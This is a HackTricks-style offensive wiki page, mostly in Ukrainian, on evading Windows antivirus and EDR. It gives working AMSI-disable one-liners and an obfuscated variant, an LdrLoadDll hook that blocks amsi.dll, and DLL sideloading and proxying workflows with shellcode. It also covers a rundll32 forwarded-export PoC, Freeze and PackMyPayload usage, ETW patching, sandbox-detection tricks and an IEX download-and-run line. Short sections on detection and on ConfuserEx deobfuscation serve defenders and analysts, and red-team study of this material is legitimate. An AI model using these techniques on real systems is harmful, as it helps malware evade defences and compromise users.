# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав(ла)** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки роботи Windows Defender шляхом імітації іншого AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Наразі AVs використовують різні методи для визначення, чи є файл шкідливим: static detection, dynamic analysis, а для більш просунутих EDRs — behavioural analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарному файлі або скрипті, а також витягуванням інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може швидше вас видати, оскільки їх, ймовірно, вже проаналізували та позначили як шкідливі. Існує кілька способів обійти таке виявлення:

- **Шифрування**

Якщо ви зашифруєте бінарник, AV не зможе виявити вашу програму, але вам знадобиться якийсь завантажувач, щоб розшифрувати та запустити програму в пам'яті.

- **Обфускація**

Іноді достатньо просто змінити деякі рядки у вашому бінарному файлі або скрипті, щоб пройти повз AV, але це може бути трудомістким завданням залежно від того, що саме ви намагаєтесь обфускувати.

- **Власні інструменти**

Якщо ви розробляєте власні інструменти, не буде відомих сигнатур, але це займає багато часу та зусиль.

> [!TIP]
> Гарний спосіб перевірити статичне виявлення Windows Defender — це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і просить Defender просканувати кожен окремо, таким чином можна точно дізнатися, які рядки або байти у вашому бінарному файлі позначені.

Рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичну AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш бінарник у sandbox і спостерігає за шкідливою активністю (наприклад, спроби розшифрувати та прочитати паролі браузера, виконати minidump на LSASS тощо). З цим може бути трохи складніше працювати, але ось кілька речей, які можна зробити, щоб уникнути sandbox.

- **Затримка (sleep) перед виконанням** В залежності від реалізації, це може бути хорошим способом обійти dynamic analysis AV. AV мають дуже малий час на сканування файлів, щоб не переривати роботу користувача, тому використання довгих затримок може порушити аналіз бінарників. Проблема в тому, що багато sandbox можуть просто пропустити sleep залежно від реалізації.
- **Перевірка ресурсів машини** Зазвичай sandbox мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б уповільнювати машину користувача. Тут можна проявити креативність, наприклад, перевіряти температуру CPU або швидкість вентиляторів — не все буде реалізовано в sandbox.
- **Перевірки, специфічні для машини** Якщо ви хочете таргетувати користувача, чия робоча станція приєднана до домену "contoso.local", ви можете перевірити домен комп'ютера і, якщо він не збігається, завершити виконання програми.

Виявилось, що computername sandbox-а Microsoft Defender — HAL9TH, тож ви можете перевіряти ім'я комп'ютера у вашому malware перед детонацією; якщо ім'я співпадає з HAL9TH — ви всередині Defender's sandbox і можете завершити виконання програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька інших корисних порад від [@mgeeky](https://twitter.com/mariuszbit) для протидії Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже казали раніше, **публічні інструменти** зрештою **будуть виявлені**, тож варто поставити собі питання:

Наприклад, якщо ви хочете дампити LSASS, **чи дійсно вам потрібно використовувати mimikatz**? Або можна використати інший, менш відомий проєкт, який також дампить LSASS.

Правильна відповідь, швидше за все, — другий варіант. На прикладі mimikatz: це, ймовірно, один із найбільш, якщо не найпомітніших інструментів для AV і EDR; хоча проєкт крутий, з ним складно працювати в плані обходу AV, тож просто шукайте альтернативи для досягнення вашої мети.

> [!TIP]
> При модифікації payloads для уникнення виявлення обов'язково вимкніть автоматичну відправку зразків у Defender, і, серйозно, **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL**, якщо ваша мета — довготривала евазія. Якщо хочете перевірити, чи виявляє певний AV ваш payload, встановіть його у VM, спробуйте вимкнути автоматичну відправку зразків і тестуйте там, доки не буде задовільного результату.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте перевагу використанню DLL для евазії**: з мого досвіду, DLL-файли зазвичай **набагато менше виявляються** та аналізуються, тож це дуже проста хитрість, щоб уникнути виявлення в деяких випадках (якщо ваш payload може виконуватися як DLL, звісно).

Як видно на цьому зображенні, DLL Payload від Havoc має рівень виявлення 4/26 на antiscan.me, тоді як EXE payload має 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного Havoc EXE payload проти звичайного Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька трюків, які можна використовувати з DLL-файлами, щоб бути значно більш прихованими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи як жертву-програму, так і шкідливі payload(s) поруч один з одним.

Ви можете перевірити програми, вразливі до DLL Sideloading, використовуючи [Siofra](https://github.com/Cybereason/siofra) та наступний powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking всередині "C:\Program Files\\" та DLL-файлів, які вони намагаються завантажити.

Я настійно рекомендую вам **explore DLL Hijackable/Sideloadable programs yourself**, ця техніка досить прихована, якщо виконана правильно, але якщо ви використовуєте публічно відомі DLL Sideloadable programs, вас можуть легко викрити.

Просто помістивши шкідливий DLL з іменем, яке програма очікує завантажити, не завантажить ваш payload, оскільки програма очікує певні функції всередині цього DLL; щоб виправити цю проблему, ми використаємо іншу техніку, яка називається **DLL Proxying/Forwarding**.

**DLL Proxying** пересилає виклики, які програма робить, з proxy (and malicious) DLL до оригінального DLL, таким чином зберігаючи функціональність програми та дозволяючи обробляти виконання вашого payload.

Я буду використовувати проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда надасть нам два файли: шаблон вихідного коду DLL і оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)) і proxy DLL мають 0/26 Detection rate на [antiscan.me](https://antiscan.me)! Я вважаю це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **наполегливо рекомендую** переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб детальніше ознайомитися з тим, про що ми говорили.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules можуть експортувати функції, які фактично є "forwarders": замість вказівки на код, запис експорту містить ASCII-рядок у формі `TargetDll.TargetFunc`. Коли викликач розв'язує експорт, Windows loader зробить:

- Завантажить `TargetDll`, якщо він ще не завантажений
- Отримає з нього `TargetFunc`

Ключові моменти для розуміння:
- Якщо `TargetDll` є KnownDLL, він постачається з захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає каталог модуля, що виконує розв'язання переспрямування.

Це дає змогу використовувати непряму примітив sideloading: знайти підписаний DLL, який експортує функцію, переспрямовану на ім'я модуля, що не є KnownDLL, потім помістити поруч цей підписаний DLL та attacker-controlled DLL із точно таким самим ім'ям цільового модуля переспрямування. Коли переспрямований експорт викликається, завантажувач розв'язує переспрямування і завантажує ваш DLL з того самого каталогу, виконуючи ваш DllMain.

Приклад, спостережений у Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він вирішується за звичайним порядком пошуку.

PoC (copy-paste):
1) Скопіюйте підписаний системний DLL до папки з правами запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть зловмисний `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімального `DllMain`; вам не потрібно реалізовувати перенаправлену функцію, щоб викликати `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ініціюйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв'язування `KeyIsoSetAuditingInterface` завантажувач переходить по перенаправленню до `NCRYPTPROV.SetAuditingInterface`
- Завантажувач потім завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" лише після того, як `DllMain` вже виконався

Поради для пошуку:
- Зосередьтеся на перенаправлених експортів (forwarded exports), де цільовий модуль не є KnownDLL. KnownDLLs перелічені під `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати перенаправлені експорти за допомогою інструментів, таких як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар Windows 11 forwarder, щоб шукати кандидатів: https://hexacorn.com/d/apis_fwd.txt

Ідеї виявлення/захисту:
- Моніторьте LOLBins (e.g., rundll32.exe), які завантажують підписані DLLs із несистемних шляхів, а потім із того ж каталогу завантажують non-KnownDLLs з тією ж базовою назвою
- Налаштуйте оповіщення на ланцюжки процесів/модулів, такі як: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Впровадьте політики цілісності коду (WDAC/AppLocker) і забороніть одночасний запис і виконання в каталогах додатків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze для завантаження та виконання вашого shellcode у прихованому режимі.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ухилення — це гра в котика та мишку: те, що працює сьогодні, може бути виявлене завтра. Тому ніколи не покладайтесь лише на один інструмент; за можливості намагайтесь ланцюжити декілька технік ухилення.

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **files on disk**, тож якщо вдавалось якось виконати payloads **directly in-memory**, AV нічого не міг вдіяти через відсутність видимості.

Функція AMSI інтегрована в такі компоненти Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Вона дозволяє антивірусним рішенням інспектувати поведінку скриптів, надаючи вміст скриптів у вигляді, який не зашифрований і не обфусцований.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` призведе до наступного сповіщення в Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що воно додає префікс `amsi:` та потім шлях до виконуваного файлу, з якого був запущений скрипт — у цьому випадку, powershell.exe

Ми не скидали жодних файлів на диск, але все одно були виявлені в пам'яті через AMSI.

Крім того, починаючи з **.NET 4.8**, C# код також проганяється через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для завантаження виконання в пам'яті. Тому для in-memory execution, якщо ви хочете обійти AMSI, рекомендується використовувати нижчі версії .NET (наприклад 4.7.2 або нижче).

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI в основному працює зі static detections, модифікація скриптів, які ви намагаєтесь завантажити, може бути хорошим способом ухилення від виявлення.

Однак AMSI має здатність роздебфусцивувати скрипти навіть якщо вони мають кілька шарів обфускації, тому обфускація може бути поганим варіантом залежно від того, як вона зроблена. Це ускладнює просте ухилення. Хоча іноді достатньо змінити кілька імен змінних — і все буде працювати, тож усе залежить від того, наскільки сильно щось було позначено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), з ним можна відносно легко маніпулювати навіть під непривілейованим користувачем. Через цю недосконалість реалізації AMSI дослідники знайшли кілька способів ухилитися від сканування AMSI.

**Forcing an Error**

Примусове невдале ініціалізування AMSI (amsiInitFailed) призведе до того, що для поточного процесу не буде ініційовано жодного сканування. Спочатку це було розкрито [Matt Graeber](https://twitter.com/mattifestation), і Microsoft розробив сигнатуру, щоб запобігти широкому використанню.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усе, що знадобилося, — один рядок коду powershell, щоб зробити AMSI непридатним для поточного процесу powershell. Цей рядок, звісно, був помічений самим AMSI, тому потрібно внести деякі зміни, щоб використати цю техніку.

Ось змінений AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Майте на увазі, що це, ймовірно, буде помічено після публікації, тому не слід публікувати код, якщо ваша мета — залишитися непоміченим.

**Memory Patching**

Цю техніку спочатку виявив [@RastaMouse](https://twitter.com/_RastaMouse/) і вона полягає у знаходженні адреси функції "AmsiScanBuffer" в amsi.dll (відповідальної за сканування введених користувачем даних) та перезаписі її інструкціями, що повертають код E_INVALIDARG; таким чином результат фактичного сканування стане 0, що тлумачиться як чистий результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Існує також багато інших технік обходу AMSI з використанням powershell, перегляньте [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) та [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) щоб дізнатися більше про них.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI ініціалізується лише після того, як `amsi.dll` буде завантажено в поточний процес. Надійний, незалежний від мови обхід — встановити user‑mode hook на `ntdll!LdrLoadDll`, який повертає помилку, коли запитуваний модуль — `amsi.dll`. У результаті AMSI ніколи не завантажується і для цього процесу сканування не відбуваються.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює для PowerShell, WScript/CScript та кастомних загрузчиків (будь‑що, що в іншому випадку завантажило б AMSI).
- Поєднувати з передачею скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів у командному рядку.
- Спостерігалось використання цим загрузчиками, що запускаються через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

Ви можете використовувати інструмент такий як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлений підпис AMSI з пам'яті поточного процесу. Цей інструмент працює шляхом сканування пам'яті поточного процесу на підпис AMSI та перезапису його інструкціями NOP, ефективно видаляючи його з пам'яті.

**AV/EDR products that uses AMSI**

Ви можете знайти список AV/EDR продуктів, які використовують AMSI, у **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тож ви можете запускати свої скрипти без сканування AMSI. Ви можете зробити це:
```bash
powershell.exe -version 2
```
## Логування PS

PowerShell logging — це можливість, яка дозволяє записувати всі команди PowerShell, виконані на системі. Це корисно для аудиту та усунення несправностей, але також може бути **проблемою для атакуючих, які хочуть уникнути виявлення**.

Щоб обійти логування PowerShell, можна використати наступні техніки:

- **Disable PowerShell Transcription and Module Logging**: можна використати інструмент, такий як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs), для цієї мети.
- **Use Powershell version 2**: якщо використовувати PowerShell версії 2, AMSI не завантажиться, тож ви зможете виконувати скрипти без сканування AMSI. Можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: використайте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб запустити powershell без захистів (саме це використовує `powerpick` з Cobal Strike).

## Обфускація

> [!TIP]
> Декілька технік обфускації спираються на шифрування даних, що підвищує ентропію бінарника і полегшує його виявлення AVs та EDRs. Будьте обережні з цим і можливо застосовуйте шифрування лише до конкретних частин коду, які є чутливими або мають бути приховані.

### Деобфускація ConfuserEx-захищених .NET бінарників

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто зустрічаються кілька шарів захисту, які блокують decompilers і sandboxes. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою інструментів типу dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx шифрує кожне *method body* і розшифровує його всередині static constructor модуля (`<Module>.cctor`). Це також патчить PE checksum, тому будь-яка модифікація може призвести до падіння бінарника. Використайте **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі і перезаписати чисту збірку:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисні при створенні власного unpacker.

2.  Symbol / control-flow recovery – передайте *clean* файл у **de4dot-cex** (форк de4dot з підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – вибрати профіль ConfuserEx 2  
• de4dot скасує control-flow flattening, відновить оригінальні простори імен, класи та імена змінних, а також розшифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів на легковісні wrapper-функції (так звані *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні бачити звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()` замість непрозорих wrapper-функцій (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отриманий бінарник у dnSpy, пошукайте великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *реальний* payload. Часто malware зберігає його як TLV-encoded масив байтів, ініціалізований всередині `<Module>.byte_0`.

Наведена ланцюжок відновлює потік виконання **без** необхідності запускати шкідливий зразок — корисно при роботі на офлайн-робочій станції.

> 🛈  ConfuserEx створює спеціальний атрибут з назвою `ConfusedByAttribute`, який можна використати як IOC для автоматичної триажі зразків.

#### Однолайнер
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати відкритий форк компіляційного набору [LLVM], здатний підвищити безпеку ПЗ через [code obfuscation] та захист від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації під час компіляції зашифрованого коду без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає рівень зашифрованих операцій, згенерованих за допомогою фреймворку C++ template metaprogramming, що ускладнить завдання тому, хто захоче зламати додаток.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — x64 binary obfuscator, який вміє обфускувати різні PE-файли, включаючи: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — тонкощі lnакого фрейморка обфускації коду для мов, що підтримуються LLVM, який використовує ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly, перетворюючи звичайні інструкції в ROP-ланцюги, руйнуючи наше уявлення про звичний контроль потоку.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor вміє конвертувати існуючі EXE/DLL у shellcode, а потім завантажувати їх

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не спровокують SmartScreen**.

Дуже ефективний спосіб запобігти тому, щоб ваші payloads отримали Mark of The Web — упакувати їх усередині якогось контейнера, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не може** бути застосований до **не NTFS** томів.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — інструмент, який пакує payloads у вихідні контейнери, щоб обійти Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування в Windows, який дозволяє додаткам та компонентам системи **логувати події**. Однак його також можуть використовувати продукти безпеки для моніторингу та виявлення шкідливої активності.

Аналогічно до того, як AMSI відключається (bypassed), також можливо змусити функцію **`EtwEventWrite`** у процесі в просторі користувача одразу повертати керування без логування подій. Це робиться шляхом патчингу функції в пам'яті, щоб вона миттєво поверталася, фактично відключаючи ETW-логування для цього процесу.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory відомий уже досить давно і досі є відмінним способом запуску ваших post-exploitation інструментів без виявлення AV.

Оскільки payload буде завантажено безпосередньо в пам'ять без звернення до диска, нам потрібно буде лише подбати про патчинг AMSI для всього процесу.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи зробити це:

- **Fork\&Run**

Це включає **створення нового жертвенного процесу (sacrificial process)**, інжекцію вашого post-exploitation шкідливого коду в цей новий процес, виконання коду і після завершення — завершення нового процесу. У цього підходу є як переваги, так і недоліки. Перевага методу fork and run в тому, що виконання відбувається **поза** нашим Beacon implant процесом. Це означає, що якщо щось піде не так або буде виявлено під час наших post-exploitation дій, є **значно більший шанс**, що наш **імплант виживе.** Недолік полягає в тому, що існує **більший ризик** бути виявленим через **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей підхід полягає в інжекції post-exploitation шкідливого коду **в сам процес**. Таким чином можна уникнути створення нового процесу і його сканування AV, але недолік у тому, що якщо під час виконання payload щось піде не так, є **значно більший шанс** **втратити ваш beacon**, оскільки він може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете більше дізнатися про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **to the interpreter environment installed on the Attacker Controlled SMB share**.

Надаючи доступ до Interpreter Binaries та середовища на SMB share, ви можете **execute arbitrary code in these languages within memory** скомпрометованої машини.

The repo indicates: Defender все ще сканує скрипти, але, використовуючи Go, Java, PHP тощо, ми отримуємо **більше гнучкості для обходу статичних сигнатур**. Тестування з випадковими не обфусцованими reverse shell скриптами на цих мовах показало успішні результати.

